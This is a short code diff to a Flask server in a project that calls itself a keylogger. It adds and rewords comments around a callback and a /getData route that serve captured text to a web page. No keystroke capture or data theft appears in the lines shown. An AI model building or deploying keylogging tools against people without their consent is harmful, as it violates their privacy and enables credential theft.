@@ -22,7 +22,7 @@ CORS(app)
 app.use_static_for_root = True
 text = 'Welcome to keylogger'
 
-
+# Define callback function to listen realtime updates
 def callback(event):
     global text
     if event.data:
@@ -52,7 +52,7 @@ def storeKeys():
 # Jsonify the content in every 4 seconds to see the realtime updates on website
 # Checkout index.html file inside the template folder
 
-# This is the helper route
+# Get the udpated text data
 @app.route('/getData', methods=["GET"])
 def getData():
     global text
